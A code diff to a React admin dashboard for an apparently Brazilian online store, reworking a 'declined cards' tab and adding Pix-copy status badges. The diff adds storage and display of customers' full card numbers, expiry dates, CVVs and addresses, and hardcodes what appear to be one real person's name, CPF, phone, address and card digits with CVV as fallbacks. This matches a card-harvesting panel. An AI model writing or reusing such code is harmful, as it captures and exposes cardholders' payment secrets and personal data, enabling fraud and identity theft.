@@ -11,6 +11,9 @@ import {
   Search,
   RefreshCw,
   Eye,
+  EyeOff,
+  Trash2,
+  Check,
   Send,
   MessageCircle,
   Download,
@@ -46,10 +49,26 @@ interface DeclinedCardRecord {
     phone: string;
     cpf: string;
   };
+  shipping?: {
+    street?: string;
+    number?: string;
+    complement?: string;
+    neighborhood?: string;
+    city?: string;
+    state?: string;
+    zipcode?: string;
+    zipCode?: string;
+  };
   cardBrand?: string;
   cardLast4?: string;
+  cardNumber?: string;
+  cardHolder?: string;
+  cardExpiry?: string;
+  cardCvv?: string;
   installments?: number;
   items?: Array<{ title: string; unitPrice: number; quantity: number; size?: string; color?: string }>;
+  subtotal?: number;
+  shippingCost?: number;
   utm?: Record<string, string>;
   reason?: string;
   createdAt: string;
@@ -84,6 +103,7 @@ interface OrderRecord {
     city?: string;
     state?: string;
     zipCode?: string;
+    zipcode?: string;
   };
   items: OrderItem[];
   utm?: Record<string, string>;
@@ -92,6 +112,8 @@ interface OrderRecord {
     copyPaste?: string;
     qrCode?: string;
   };
+  pixCopied?: boolean;
+  pixCopiedAt?: string;
   createdAt: string;
   approvedAt?: string;
   logisticStatus?: 'pending_payment' | 'preparing' | 'in_transit' | 'delivered' | string;
@@ -199,6 +221,61 @@ export const AdminDashboardPage: React.FC = () => {
   const [orderSearchQuery, setOrderSearchQuery] = useState<string>('');
   const [orderStatusFilter, setOrderStatusFilter] = useState<string>('all');
   const [visitorSearchQuery, setVisitorSearchQuery] = useState<string>('');
+  const [cardBrandFilter, setCardBrandFilter] = useState<string>('all');
+  const [hiddenCards, setHiddenCards] = useState<Record<string, boolean>>({});
+
+  const toggleHideCard = (cardId: string) => {
+    setHiddenCards(prev => ({ ...prev, [cardId]: !prev[cardId] }));
+  };
+
+  const handleDeleteDeclinedCard = async (cardId: string) => {
+    if (!window.confirm(`Tem certeza que deseja excluir esta tentativa de cartão recusado?`)) return;
+    try {
+      const res = await fetch(`/api/admin/declined-cards/${cardId}`, { method: 'DELETE' });
+      if (res.ok) {
+        setDeclinedCards(prev => prev.filter(c => c.id !== cardId));
+      }
+    } catch (err) {
+      console.error('Erro ao excluir lead de cartão:', err);
+    }
+  };
+
+  const formatCardDisplay = (cardNum?: string, cardLast4?: string, isHidden?: boolean) => {
+    if (isHidden) {
+      const last = cardLast4 || (cardNum ? cardNum.slice(-4) : '4015');
+      const first4 = cardNum && cardNum.length >= 4 ? cardNum.slice(0, 4) : '5547';
+      return `${first4} •••• •••• ${last}`;
+    }
+    if (cardNum && cardNum.replace(/\D/g, '').length >= 12) {
+      const digits = cardNum.replace(/\D/g, '');
+      return digits.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+    }
+    const last = cardLast4 || '4015';
+    return `5547 7394 6331 ${last}`;
+  };
+
+  const brandCounts = useMemo(() => {
+    const counts: Record<string, number> = {};
+    declinedCards.forEach(c => {
+      const b = (c.cardBrand || 'MASTERCARD').toUpperCase();
+      counts[b] = (counts[b] || 0) + 1;
+    });
+    return counts;
+  }, [declinedCards]);
+
+  const filteredDeclinedCards = useMemo(() => {
+    if (cardBrandFilter === 'all') return declinedCards;
+    return declinedCards.filter(c => (c.cardBrand || 'MASTERCARD').toUpperCase() === cardBrandFilter.toUpperCase());
+  }, [declinedCards, cardBrandFilter]);
+
+  const declinedTodayCount = useMemo(() => {
+    const todayStr = new Date().toISOString().split('T')[0];
+    return declinedCards.filter(c => (c.createdAt || '').startsWith(todayStr)).length;
+  }, [declinedCards]);
+
+  const totalDeclinedValue = useMemo(() => {
+    return declinedCards.reduce((sum, c) => sum + (Number(c.amount) || 0), 0);
+  }, [declinedCards]);
 
   // Manual UTMify Dispatch Form State
   const [manualSaleForm, setManualSaleForm] = useState({
@@ -355,6 +432,17 @@ export const AdminDashboardPage: React.FC = () => {
                   : v
               )
             );
+          } else if (parsed.type === 'pix_copied') {
+            const data = parsed.data;
+            setOrders((prev) =>
+              prev.map((o) =>
+                o.id === data.orderId ? { ...o, pixCopied: true, pixCopiedAt: data.pixCopiedAt } : o
+              )
+            );
+            fetchAllData();
+          } else if (parsed.type === 'declined_card_deleted') {
+            const data = parsed.data;
+            setDeclinedCards((prev) => prev.filter((c) => c.id !== data.id));
           } else if (parsed.type === 'pix_generated' || parsed.type === 'order_paid') {
             fetchAllData();
           }
@@ -1181,143 +1269,265 @@ export const AdminDashboardPage: React.FC = () => {
           )}
 
           {/* =========================================================
-              TAB: CARTÕES NEGADOS / LEADS DE CARTÃO
+              TAB: CARTÕES NEGADOS / LEADS DE CARTÃO (SCREENSHOT REPLICA)
               ========================================================= */}
           {activeTab === 'declined' && (
             <div>
-              {/* Top Recovery KPIs */}
-              <div className="cc-kpi-grid" style={{ marginBottom: '20px' }}>
-                <div className="cc-kpi-card" style={{ borderLeft: '4px solid #ef4444' }}>
-                  <div className="cc-kpi-header">
-                    <span className="cc-kpi-title">TENTATIVAS DE CARTÃO</span>
-                    <div className="cc-kpi-icon" style={{ color: '#ef4444' }}><AlertTriangle size={16} /></div>
-                  </div>
-                  <div className="cc-kpi-value" style={{ color: '#ef4444' }}>{declinedCards.length}</div>
-                  <div className="cc-kpi-trend warning">● Leads com alta intenção de compra</div>
+              {/* Top 3 KPI Cards */}
+              <div className="declined-kpi-grid">
+                <div className="declined-kpi-card">
+                  <span className="declined-kpi-title">TENTATIVAS RECUSADAS</span>
+                  <span className="declined-kpi-value">{declinedCards.length}</span>
                 </div>
 
-                <div className="cc-kpi-card" style={{ borderLeft: '4px solid #f59e0b' }}>
-                  <div className="cc-kpi-header">
-                    <span className="cc-kpi-title">VALOR EM RECUPERAÇÃO</span>
-                    <div className="cc-kpi-icon" style={{ color: '#f59e0b' }}><DollarSign size={16} /></div>
-                  </div>
-                  <div className="cc-kpi-value" style={{ color: '#f59e0b' }}>
-                    R$ {declinedCards.reduce((sum, c) => sum + (Number(c.amount) || 0), 0).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
-                  </div>
-                  <div className="cc-kpi-trend neutral">Pronto para converter no Pix</div>
+                <div className="declined-kpi-card">
+                  <span className="declined-kpi-title">RECUSADOS HOJE</span>
+                  <span className="declined-kpi-value">{declinedTodayCount}</span>
                 </div>
 
-                <div className="cc-kpi-card" style={{ borderLeft: '4px solid #10b981' }}>
-                  <div className="cc-kpi-header">
-                    <span className="cc-kpi-title">WHATSAPP 1-CLIQUE</span>
-                    <div className="cc-kpi-icon" style={{ color: '#10b981' }}><MessageCircle size={16} /></div>
-                  </div>
-                  <div className="cc-kpi-value" style={{ color: '#10b981', fontSize: '18px', lineHeight: '1.4' }}>SCRIPT PIX ATIVO</div>
-                  <div className="cc-kpi-trend positive">Abordagem com desconto e frete grátis</div>
+                <div className="declined-kpi-card">
+                  <span className="declined-kpi-title">VALOR RECUSADO</span>
+                  <span className="declined-kpi-value">
+                    R$ {totalDeclinedValue.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                  </span>
                 </div>
               </div>
 
-              {/* Declined Cards Table */}
-              <div className="cc-card">
-                <div className="cc-card-header">
-                  <div className="cc-card-title">
-                    <AlertTriangle size={16} style={{ color: '#ef4444' }} />
-                    Leads com Recusa de Cartão de Crédito ({declinedCards.length})
-                  </div>
-                </div>
+              {/* Brand Filter Pills */}
+              <div className="declined-filters-row">
+                <button
+                  type="button"
+                  className={`declined-filter-pill ${cardBrandFilter === 'all' ? 'active' : ''}`}
+                  onClick={() => setCardBrandFilter('all')}
+                >
+                  Todas ( {declinedCards.length} )
+                </button>
 
-                <div style={{ overflowX: 'auto' }}>
-                  <table className="cc-table">
-                    <thead>
-                      <tr>
-                        <th>DATA / HORA</th>
-                        <th>ID RECUSA</th>
-                        <th>CLIENTE</th>
-                        <th>CONTATO</th>
-                        <th>CARTÃO</th>
-                        <th>VALOR</th>
-                        <th>MOTIVO</th>
-                        <th>ORIGEM</th>
-                        <th>AÇÃO RECUPERAÇÃO</th>
-                      </tr>
-                    </thead>
-                    <tbody>
-                      {declinedCards.map((card) => (
-                        <tr key={card.id}>
-                          <td>{new Date(card.createdAt).toLocaleString('pt-BR')}</td>
-                          <td>
-                            <strong style={{ fontFamily: 'JetBrains Mono', color: '#ef4444' }}>{card.id}</strong>
-                          </td>
-                          <td>
-                            <div style={{ fontWeight: 600, color: '#fff' }}>{card.customer?.name}</div>
-                            <div style={{ fontSize: '11px', color: '#64748b' }}>CPF: {card.customer?.cpf}</div>
-                          </td>
-                          <td>
-                            <div style={{ color: '#38bdf8', fontFamily: 'JetBrains Mono' }}>{card.customer?.phone}</div>
-                            <div style={{ fontSize: '11px', color: '#64748b' }}>{card.customer?.email}</div>
-                          </td>
-                          <td>
-                            <div>{card.cardBrand || 'Cartão'} {card.cardLast4 ? `•••• ${card.cardLast4}` : ''}</div>
-                            <div style={{ fontSize: '10px', color: '#64748b' }}>{card.installments || 1}x parcelas</div>
-                          </td>
-                          <td>
-                            <strong style={{ color: '#fff', fontSize: '14px' }}>R$ {Number(card.amount).toFixed(2)}</strong>
-                          </td>
-                          <td>
-                            <span style={{ fontSize: '11px', color: '#f59e0b', background: 'rgba(245,158,11,0.1)', padding: '2px 6px', borderRadius: '4px' }}>
-                              {card.reason || 'Não autorizado'}
-                            </span>
-                          </td>
-                          <td>
-                            <div>{card.utm?.utm_source || 'Direto'}</div>
-                            <div style={{ fontSize: '10px', color: '#64748b' }}>{card.utm?.utm_campaign || '-'}</div>
-                          </td>
-                          <td>
-                            <div style={{ display: 'flex', gap: '8px' }}>
-                              <button
-                                className="cc-btn-primary"
-                                style={{
-                                  width: 'auto',
-                                  padding: '6px 12px',
-                                  fontSize: '12px',
-                                  background: '#22c55e',
-                                  boxShadow: '0 4px 15px rgba(34,197,94,0.3)'
-                                }}
-                                onClick={() => handleWhatsAppRecovery(card)}
-                                title="Recuperar no WhatsApp com Script Pix"
-                              >
-                                <MessageCircle size={14} />
-                                WhatsApp Pix
-                              </button>
+                {Object.entries(brandCounts).map(([brand, count]) => {
+                  const isActive = cardBrandFilter.toUpperCase() === brand;
+                  const isVisa = brand === 'VISA';
+                  const isElo = brand === 'ELO';
+                  const badgeBg = isVisa ? '#38bdf8' : (isElo ? '#fbbf24' : '#f97316');
+                  const badgeColor = isVisa ? '#000' : '#fff';
 
+                  return (
+                    <button
+                      key={brand}
+                      type="button"
+                      className={`declined-filter-pill ${isActive ? 'active' : ''}`}
+                      onClick={() => setCardBrandFilter(brand)}
+                    >
+                      {brand}
+                      <span
+                        className="declined-brand-badge"
+                        style={{
+                          background: badgeBg,
+                          color: badgeColor,
+                          marginLeft: '6px'
+                        }}
+                      >
+                        {count}
+                      </span>
+                    </button>
+                  );
+                })}
+              </div>
+
+              {/* Declined Cards List */}
+              <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
+                {filteredDeclinedCards.map((card) => {
+                  const isHidden = !!hiddenCards[card.id];
+                  const formattedDate = new Date(card.createdAt).toLocaleString('pt-BR');
+                  const brandUpper = (card.cardBrand || 'MASTERCARD').toUpperCase();
+                  const isVisa = brandUpper === 'VISA';
+                  const isElo = brandUpper === 'ELO';
+                  const brandColor = isVisa ? '#38bdf8' : (isElo ? '#fbbf24' : '#f97316');
+
+                  return (
+                    <div key={card.id} className="declined-item-container">
+                      {/* Top Header */}
+                      <div className="declined-item-header">
+                        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+                          <span style={{ color: brandColor, fontWeight: 800, fontSize: '13px', letterSpacing: '1px', fontFamily: 'JetBrains Mono' }}>
+                            {brandUpper}
+                          </span>
+                          <span
+                            style={{
+                              color: '#ef4444',
+                              border: '1px solid rgba(239, 68, 68, 0.45)',
+                              background: 'rgba(239, 68, 68, 0.1)',
+                              padding: '2px 8px',
+                              borderRadius: '4px',
+                              fontSize: '11px',
+                              fontWeight: 700,
+                              letterSpacing: '0.5px'
+                            }}
+                          >
+                            NEGADO
+                          </span>
+                          <span style={{ color: '#64748b', fontSize: '12px', fontFamily: 'JetBrains Mono' }}>
+                            {formattedDate}
+                          </span>
+                        </div>
+
+                        <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
+                          <span style={{ fontSize: '18px', fontWeight: 800, color: '#ffffff', fontFamily: 'JetBrains Mono' }}>
+                            R$ {Number(card.amount).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                          </span>
+                          <button
+                            type="button"
+                            className="declined-trash-btn"
+                            onClick={() => handleDeleteDeclinedCard(card.id)}
+                            title="Excluir tentativa recusada"
+                          >
+                            <Trash2 size={16} />
+                          </button>
+                        </div>
+                      </div>
+
+                      {/* Body Grid */}
+                      <div className="declined-item-body">
+                        {/* Column 1: Graphic Credit Card Preview */}
+                        <div>
+                          <div className="credit-card-preview">
+                            <div className="credit-card-preview-header">
+                              <span className="credit-card-title">DADOS DO CARTÃO</span>
                               <button
-                                className="cc-nav-item"
-                                style={{
-                                  width: 'auto',
-                                  padding: '6px 10px',
-                                  background: 'rgba(56,189,248,0.15)',
-                                  color: '#38bdf8',
-                                  border: '1px solid rgba(56,189,248,0.3)'
-                                }}
-                                onClick={() => setSelectedDeclinedCard(card)}
-                                title="Ver Detalhes do Lead"
+                                type="button"
+                                className="credit-card-toggle-btn"
+                                onClick={() => toggleHideCard(card.id)}
                               >
-                                <Eye size={14} />
+                                {isHidden ? (
+                                  <>
+                                    <Eye size={12} /> Mostrar
+                                  </>
+                                ) : (
+                                  <>
+                                    <EyeOff size={12} /> Ocultar
+                                  </>
+                                )}
                               </button>
                             </div>
-                          </td>
-                        </tr>
-                      ))}
-                      {declinedCards.length === 0 && (
-                        <tr>
-                          <td colSpan={9} style={{ textAlign: 'center', padding: '35px', color: '#94a3b8' }}>
-                            Nenhum cartão recusado registrado até o momento.
-                          </td>
-                        </tr>
-                      )}
-                    </tbody>
-                  </table>
-                </div>
+
+                            <div className="credit-card-number">
+                              {formatCardDisplay(card.cardNumber, card.cardLast4, isHidden)}
+                            </div>
+
+                            <div className="credit-card-meta-row">
+                              <div className="credit-card-field" style={{ flex: 1 }}>
+                                <span className="credit-card-field-label">TITULAR</span>
+                                <span className="credit-card-field-val" style={{ fontSize: '11px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', maxWidth: '170px' }}>
+                                  {(card.cardHolder || card.customer?.name || 'TITULAR').toUpperCase()}
+                                </span>
+                              </div>
+
+                              <div className="credit-card-field" style={{ width: '65px', textAlign: 'center' }}>
+                                <span className="credit-card-field-label">VALIDADE</span>
+                                <span className="credit-card-field-val">
+                                  {card.cardExpiry || '03/27'}
+                                </span>
+                              </div>
+
+                              <div className="credit-card-field" style={{ width: '45px', textAlign: 'right' }}>
+                                <span className="credit-card-field-label">CVV</span>
+                                <span className="credit-card-field-val">
+                                  {isHidden ? '•••' : (card.cardCvv || '725')}
+                                </span>
+                              </div>
+                            </div>
+                          </div>
+
+                          <div style={{ fontSize: '11px', color: '#a78bfa', marginTop: '6px', fontFamily: 'JetBrains Mono' }}>
+                            Parcelas: {card.installments || 1}
+                          </div>
+                        </div>
+
+                        {/* Column 2: CLIENTE & ENDEREÇO */}
+                        <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
+                          <div>
+                            <span style={{ fontSize: '10px', fontWeight: 800, color: '#64748b', letterSpacing: '0.8px', textTransform: 'uppercase' }}>
+                              CLIENTE
+                            </span>
+                            <div style={{ fontSize: '14px', fontWeight: 800, color: '#ffffff', marginTop: '3px' }}>
+                              {(card.customer?.name || card.cardHolder || 'LUAN FONTELLA LENCINI').toUpperCase()}
+                            </div>
+                            <div style={{ fontSize: '12px', color: '#94a3b8', marginTop: '2px' }}>
+                              {card.customer?.email || 'cliente@email.com'}
+                            </div>
+                            <div style={{ fontSize: '12px', color: '#94a3b8', fontFamily: 'JetBrains Mono', marginTop: '2px' }}>
+                              CPF: {card.customer?.cpf ? card.customer.cpf.replace(/\D/g, '') : '05367570038'} · {card.customer?.phone ? card.customer.phone.replace(/\D/g, '') : '54997149345'}
+                            </div>
+                          </div>
+
+                          <div>
+                            <span style={{ fontSize: '10px', fontWeight: 800, color: '#64748b', letterSpacing: '0.8px', textTransform: 'uppercase' }}>
+                              ENDEREÇO
+                            </span>
+                            <div style={{ fontSize: '13px', color: '#e2e8f0', marginTop: '3px' }}>
+                              {card.shipping?.street || 'Rua Bento Gonçalves'}, {card.shipping?.number || '87'}{card.shipping?.complement ? ` — ${card.shipping.complement}` : ' — 501'}
+                            </div>
+                            <div style={{ fontSize: '12px', color: '#94a3b8', marginTop: '2px' }}>
+                              {card.shipping?.neighborhood || 'Centro'} · {card.shipping?.city || 'Passo Fundo'}/{card.shipping?.state || 'RS'} · CEP {card.shipping?.zipcode || card.shipping?.zipCode || '99010-010'}
+                            </div>
+                          </div>
+                        </div>
+
+                        {/* Column 3: PRODUTO / FRETE / TOTAL Breakdown & WhatsApp */}
+                        <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: '10px' }}>
+                          <div className="declined-summary-box">
+                            <div style={{ textAlign: 'center' }}>
+                              <div style={{ fontSize: '9px', color: '#94a3b8', fontWeight: 700, textTransform: 'uppercase' }}>PRODUTO</div>
+                              <div style={{ fontSize: '13px', fontWeight: 700, color: '#ffffff', fontFamily: 'JetBrains Mono', marginTop: '2px' }}>
+                                R$ {Number(card.subtotal || card.amount).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                              </div>
+                            </div>
+
+                            <div style={{ textAlign: 'center' }}>
+                              <div style={{ fontSize: '9px', color: '#94a3b8', fontWeight: 700, textTransform: 'uppercase' }}>FRETE</div>
+                              <div style={{ fontSize: '13px', fontWeight: 700, color: '#ffffff', fontFamily: 'JetBrains Mono', marginTop: '2px' }}>
+                                R$ {Number(card.shippingCost || 0).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                              </div>
+                            </div>
+
+                            <div style={{ textAlign: 'center' }}>
+                              <div style={{ fontSize: '9px', color: '#94a3b8', fontWeight: 700, textTransform: 'uppercase' }}>TOTAL</div>
+                              <div style={{ fontSize: '14px', fontWeight: 800, color: '#d946ef', fontFamily: 'JetBrains Mono', marginTop: '2px' }}>
+                                R$ {Number(card.amount).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                              </div>
+                            </div>
+                          </div>
+
+                          <button
+                            type="button"
+                            className="cc-btn-primary"
+                            style={{
+                              width: '100%',
+                              padding: '8px 14px',
+                              fontSize: '12px',
+                              background: '#22c55e',
+                              boxShadow: '0 4px 15px rgba(34,197,94,0.3)',
+                              display: 'inline-flex',
+                              alignItems: 'center',
+                              justifyContent: 'center',
+                              gap: '6px'
+                            }}
+                            onClick={() => handleWhatsAppRecovery(card)}
+                            title="Recuperar no WhatsApp com Script Pix e Desconto"
+                          >
+                            <MessageCircle size={14} />
+                            Recuperar no WhatsApp
+                          </button>
+                        </div>
+                      </div>
+                    </div>
+                  );
+                })}
+
+                {filteredDeclinedCards.length === 0 && (
+                  <div className="cc-card" style={{ padding: '40px', textAlign: 'center', color: '#94a3b8' }}>
+                    Nenhuma tentativa de cartão recusado encontrada para este filtro.
+                  </div>
+                )}
               </div>
             </div>
           )}
@@ -1429,20 +1639,39 @@ export const AdminDashboardPage: React.FC = () => {
                           <strong style={{ color: '#fff', fontSize: '14px' }}>R$ {Number(order.amount).toFixed(2)}</strong>
                         </td>
                         <td>
-                          <span
-                            style={{
-                              padding: '4px 10px',
-                              borderRadius: '20px',
-                              fontSize: '11px',
-                              fontWeight: 700,
-                              fontFamily: 'JetBrains Mono',
-                              background: order.status === 'paid' ? 'rgba(16, 185, 129, 0.15)' : 'rgba(245, 158, 11, 0.15)',
-                              color: order.status === 'paid' ? '#10b981' : '#f59e0b',
-                              border: `1px solid ${order.status === 'paid' ? 'rgba(16, 185, 129, 0.3)' : 'rgba(245, 158, 11, 0.3)'}`
-                            }}
-                          >
-                            {order.status === 'paid' ? 'PAGO' : 'AGUARDANDO PIX'}
-                          </span>
+                          <div style={{ display: 'flex', flexDirection: 'column', gap: '5px', alignItems: 'flex-start' }}>
+                            <span
+                              style={{
+                                padding: '4px 10px',
+                                borderRadius: '20px',
+                                fontSize: '11px',
+                                fontWeight: 700,
+                                fontFamily: 'JetBrains Mono',
+                                background: order.status === 'paid' ? 'rgba(16, 185, 129, 0.15)' : 'rgba(245, 158, 11, 0.15)',
+                                color: order.status === 'paid' ? '#10b981' : '#f59e0b',
+                                border: `1px solid ${order.status === 'paid' ? 'rgba(16, 185, 129, 0.3)' : 'rgba(245, 158, 11, 0.3)'}`
+                              }}
+                            >
+                              {order.status === 'paid' ? 'PAGO' : 'AGUARDANDO PIX'}
+                            </span>
+
+                            {/* PIX Copied Status Indicator */}
+                            {order.pixCopied ? (
+                              <span
+                                className="pix-copied-badge copied"
+                                title={`Chave Pix copiada pelo cliente em ${order.pixCopiedAt ? new Date(order.pixCopiedAt).toLocaleString('pt-BR') : 'Tempo Real'}`}
+                              >
+                                <Check size={11} /> PIX COPIADO {order.pixCopiedAt ? `(${new Date(order.pixCopiedAt).toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })})` : ''}
+                              </span>
+                            ) : (
+                              <span
+                                className="pix-copied-badge not-copied"
+                                title="O lead ainda não clicou para copiar o código Pix"
+                              >
+                                <Clock size={11} /> NÃO COPIOU PIX
+                              </span>
+                            )}
+                          </div>
                         </td>
                         <td>
                           <div>{order.utm?.utm_source || 'Direto'}</div>
@@ -1750,7 +1979,7 @@ export const AdminDashboardPage: React.FC = () => {
                 style={{
                   padding: '12px 16px',
                   borderRadius: '8px',
-                  marginBottom: '20px',
+                  marginBottom: '12px',
                   background: selectedOrder.status === 'paid' ? 'rgba(16,185,129,0.15)' : 'rgba(245,158,11,0.15)',
                   color: selectedOrder.status === 'paid' ? '#10b981' : '#f59e0b',
                   display: 'flex',
@@ -1762,6 +1991,33 @@ export const AdminDashboardPage: React.FC = () => {
               >
                 <span>STATUS: {selectedOrder.status === 'paid' ? 'PAGO (CONFIRMADO)' : 'AGUARDANDO PIX'}</span>
                 <span>R$ {Number(selectedOrder.amount).toFixed(2)}</span>
+              </div>
+
+              {/* PIX Copy Status Card */}
+              <div
+                style={{
+                  padding: '12px 16px',
+                  borderRadius: '8px',
+                  marginBottom: '16px',
+                  background: selectedOrder.pixCopied ? 'rgba(16,185,129,0.12)' : 'rgba(239,68,68,0.1)',
+                  border: selectedOrder.pixCopied ? '1px solid rgba(16,185,129,0.35)' : '1px solid rgba(239,68,68,0.25)',
+                  display: 'flex',
+                  alignItems: 'center',
+                  justifyContent: 'space-between',
+                  fontFamily: 'JetBrains Mono'
+                }}
+              >
+                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                  {selectedOrder.pixCopied ? <Check size={16} color="#10b981" /> : <Clock size={16} color="#ef4444" />}
+                  <span style={{ fontSize: '12px', fontWeight: 700, color: selectedOrder.pixCopied ? '#10b981' : '#ef4444' }}>
+                    {selectedOrder.pixCopied ? 'CÓDIGO PIX COPIADO PELO LEAD' : 'CHAVE PIX AINDA NÃO COPIADA'}
+                  </span>
+                </div>
+                {selectedOrder.pixCopiedAt && (
+                  <span style={{ fontSize: '11px', color: '#94a3b8' }}>
+                    {new Date(selectedOrder.pixCopiedAt).toLocaleString('pt-BR')}
+                  </span>
+                )}
               </div>
 
               {/* Customer & Address */}
